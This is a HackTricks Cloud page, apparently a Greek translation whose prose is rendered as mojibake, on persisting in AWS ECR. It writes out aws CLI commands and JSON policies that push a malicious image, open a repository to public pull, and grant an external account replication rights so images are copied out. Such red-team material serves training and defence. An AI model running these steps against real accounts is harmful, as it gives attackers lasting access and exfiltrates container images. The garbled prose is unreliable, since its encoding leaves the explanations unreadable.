# AWS - ECR Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ECR

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-ecr-enum.md" %}
[aws-ecr-enum.md](../aws-services/aws-ecr-enum.md)
{% endcontent-ref %}

### ÎšÏÏ…Ï†Î® Î•Î¹ÎºÏŒÎ½Î± Docker Î¼Îµ ÎšÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎšÏÎ´Î¹ÎºÎ±

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ **Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÎ¹ÎºÏŒÎ½Î± Docker Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ±** ÏƒÎµ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ECR ÎºÎ±Î¹ Î½Î± Ï„Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î³Î¹Î± Î½Î± Î´Î¹Î±Ï„Î·ÏÎ®ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î¹Î¼Î¿Î½Î® ÏƒÏ„Î¿Î½ ÏƒÏ„ÏŒÏ‡Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Î±Î½Î±Ï€Ï„ÏÎ¾ÎµÎ¹ Ï„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÎµÎ¹ÎºÏŒÎ½Î± ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Amazon ECS Î® EKS, Î¼Îµ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ Ï„ÏÏŒÏ€Î¿.

### Î Î¿Î»Î¹Ï„Î¹ÎºÎ® Î‘Ï€Î¿Î¸ÎµÏ„Î·ÏÎ¯Î¿Ï…

Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Î¼Î¹Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÏƒÎµ Î­Î½Î± Î¼ÏŒÎ½Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Ï€Î¿Ï… Î½Î± ÏƒÎ±Ï‚ Ï€Î±ÏÎ±Ï‡Ï‰ÏÎµÎ¯ (Î® ÏƒÎµ ÏŒÎ»Î¿Ï…Ï‚) Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿:
```bash
aws ecr set-repository-policy \
--repository-name cluster-autoscaler \
--policy-text file:///tmp/my-policy.json

# With a .json such as

{
"Version" : "2008-10-17",
"Statement" : [
{
"Sid" : "allow public pull",
"Effect" : "Allow",
"Principal" : "*",
"Action" : [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ ECR Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Î­Ï‡Î¿Ï…Î½ **Î¬Î´ÎµÎ¹Î±** Î³Î¹Î± Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î·Î½ **`ecr:GetAuthorizationToken`** API Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ IAM **Ï€ÏÎ¹Î½ Î¼Ï€Î¿ÏÎ­ÏƒÎ¿Ï…Î½ Î½Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½** ÏƒÎµ Î­Î½Î± Î¼Î·Ï„ÏÏÎ¿ ÎºÎ±Î¹ Î½Î± ÏƒÏ€ÏÏÎ¾Î¿Ï…Î½ Î® Î½Î± Ï„ÏÎ±Î²Î®Î¾Î¿Ï…Î½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ¹ÎºÏŒÎ½Î± Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Amazon ECR.
{% endhint %}

### Î Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎœÎ·Ï„ÏÏÎ¿Ï… & Î”Î¹Î±ÏƒÏ…Î½Î¿ÏÎ¹Î±ÎºÎ® Î‘Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Î½Î±Ï€Î±ÏÎ±Î³Î¬Î³ÎµÏ„Îµ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î­Î½Î± Î¼Î·Ï„ÏÏÎ¿ ÏƒÎµ Î­Î½Î±Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±ÏƒÏ…Î½Î¿ÏÎ¹Î±ÎºÎ® Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®, ÏŒÏ€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Ï„Î¿Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ** ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î±Î½Î±Ï€Î±ÏÎ±Î³Î¬Î³ÎµÏ„Îµ Ï„Î¿ Î¼Î·Ï„ÏÏÎ¿.

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Î‘ÏÏ‡Î¹ÎºÎ¬, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´ÏÏƒÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î¼Î·Ï„ÏÏÎ¿ Î¼Îµ Î¼Î¹Î± **Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î¼Î·Ï„ÏÏÎ¿Ï…** ÏŒÏ€Ï‰Ï‚:
```bash
aws ecr put-registry-policy --policy-text file://my-policy.json

# With a .json like:

{
"Sid": "asdasd",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::947247140022:root"
},
"Action": [
"ecr:CreateRepository",
"ecr:ReplicateImage"
],
"Resource": "arn:aws:ecr:eu-central-1:947247140022:repository/*"
}
```
Î¤ÏŒÏ„Îµ ÎµÏ†Î±ÏÎ¼ÏŒÏƒÏ„Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚:
```bash
aws ecr put-replication-configuration \
--replication-configuration file://replication-settings.json \
--region us-west-2

# Having the .json a content such as:
{
"rules": [{
"destinations": [{
"region": "destination_region",
"registryId": "destination_accountId"
}],
"repositoryFilters": [{
"filter": "repository_prefix_name",
"filterType": "PREFIX_MATCH"
}]
}]
}
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
